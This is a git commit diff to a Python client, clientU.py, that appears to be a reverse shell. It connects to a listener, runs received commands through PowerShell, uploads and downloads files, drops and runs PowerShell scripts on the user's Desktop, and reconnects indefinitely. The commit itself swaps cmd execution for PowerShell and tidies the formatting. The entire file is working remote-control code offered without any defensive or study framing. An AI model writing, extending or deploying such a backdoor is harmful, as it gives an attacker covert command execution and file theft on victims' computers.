1df5b9b11fa7f4339f30b54eb6cd353180205ae9
Roody Ridar2 <roodyridar2@gmail.com>
2023-07-23 14:44:22 +0300

    replace cmd by powershell

--- clientU.py
+++ clientU.py
@@ -7,9 +7,12 @@ import base64
 import time
 import platform
 # -------------------------------------------------------------------------------
-def reliable_send( data):
+
+
+def reliable_send(data):
     json_data = json.dumps(data)
     s.send(json_data.encode())
+
 
 def reliable_receive(s):
     json_data = ""
@@ -21,6 +24,8 @@ def reliable_receive(s):
             continue
 
 # Read file For Upload To Listener
+
+
 def read_file(path):
     try:
         path = os.path.normpath(path)
@@ -28,9 +33,11 @@ def read_file(path):
             return base64.b64encode(file.read()).decode()
     except Exception as e:
         return ("[-] Error " + str(e)[10:])
-    
+
 # Download File From Listener
-def write_file( path, content):
+
+
+def write_file(path, content):
     try:
         # desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
         # file_path = os.path.join(desktop_path, path)
@@ -56,6 +63,8 @@ def socket_create():
         print("Socket creation error: " + str(msg))
 
 # Connect to a remote socket
+
+
 def socket_connect():
     try:
         global host
@@ -63,7 +72,7 @@ def socket_connect():
         global s
         s.connect((host, port))
     except socket.error as msg:
-        print("Socket connection error: " , str(msg))
+        print("Socket connection error: ", str(msg))
         time.sleep(5)
         socket_create()
 
@@ -74,13 +83,13 @@ def receive_commands():
         # data = s.recv(20480).decode()
         received_command = reliable_receive(s)
         print(received_command)
-        
+
         if received_command[0] == 'cd':
             try:
                 os.chdir(received_command[1])
             except:
                 pass
-            
+
         elif received_command[0] in ['quit', 'exit']:
             s.close()
             break
@@ -88,66 +97,79 @@ def receive_commands():
         elif received_command[0] == "upload":
             file_path = received_command[2]
             file_name = os.path.basename(received_command[1])
-            
-            file_path = os.path.join(file_path, file_name)
-            command_result = write_file(path=file_path, content=received_command[3])
-            
-        elif received_command[0] == "run":
-            command_result = run_powerShell_script(data= received_command[2])
 
+            file_path = os.path.join(file_path, file_name)
+            command_result = write_file(
+                path=file_path, content=received_command[3])
+
+        elif received_command[0] == "run":
+            command_result = run_powerShell_script(data=received_command[2])
 
         elif received_command[0] == "download":
             command_result = read_file(received_command[1])
 
         else:
             command_result = execute_command(received_command)
-        
-        
+
         if received_command[0] == "whoami":
             reliable_send(get_system_info())
         else:
-            reliable_send([command_result , "\n[ " + os.getcwd() + " ]>"])
-            
-    s.close() 
-    
+            reliable_send([command_result, "[ " + os.getcwd() + " ]>"])
+
+    s.close()
+
 # run powerShell script
+
+
 def run_powerShell_script(data):
-    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+    desktop_path = os.path.join(os.path.join(
+        os.environ['USERPROFILE']), 'Desktop')
     file_path = os.path.join(desktop_path, "test.ps1")
 
     write_file(path=file_path, content=data)
     result = execute_command("PowerShell -File " + file_path)
     os.remove(file_path)
     return result
-    
+
 
 def get_system_info():
     sysInfo = platform.uname()
     USER = "?"
-    SYSTEM =  "?"
+    SYSTEM = "?"
     VERSION = "?"
     try:
         USER = sysInfo.node
-        SYSTEM =  sysInfo.system
+        SYSTEM = sysInfo.system
         VERSION = sysInfo.version
     except:
         pass
-    
-    return [USER,SYSTEM, VERSION]
-    
+
+    return [USER, SYSTEM, VERSION]
+
 # Execute command
+
 def execute_command(received_command):
     try:
-        return subprocess.check_output(received_command, shell=True).decode()
-        
-    except Exception as ex:
-        output_str = "Command not recognize"
-        print(colored(output_str,"red"))
-        print(colored(ex,"yellow"))
+        powerShell_command = ["powershell", "-command", " ".join(received_command)]
+        result = subprocess.run(
+            powerShell_command, capture_output=True, text=True)
+
+        if result.returncode == 0:
+            # execute was success
+            output_str = result.stdout
+        else:
+            # execute was failed
+            output_str = result.stderr
+
         return output_str
-        # s.send(output_str.encode() + (os.getcwd() + "> ").encode())
-        # reliable_send(output_str + ("\n[ " + os.getcwd() + " ]> "))
-        print("-----------------------------------")
+
+    except Exception as ex:
+        output_str = "Error from execute_command function"
+        print(colored(output_str, "red"))
+        print(colored(ex, "yellow"))
+        return output_str + str(ex)
+
+
 
 
 def main():
@@ -155,22 +177,20 @@ def main():
         global s
         try:
             socket_create()
-
             socket_connect()
-       
+
             try:
                 receive_commands()
             except Exception as ex:
                 continue
-            
-        except  socket.error as ex:
+
+        except socket.error as ex:
             print(colored("Error in main", "red"))
-            print( ex)
+            print(ex)
             time.sleep(5)
-            
+
         s.close()
         main()
 
 
 main()
-    
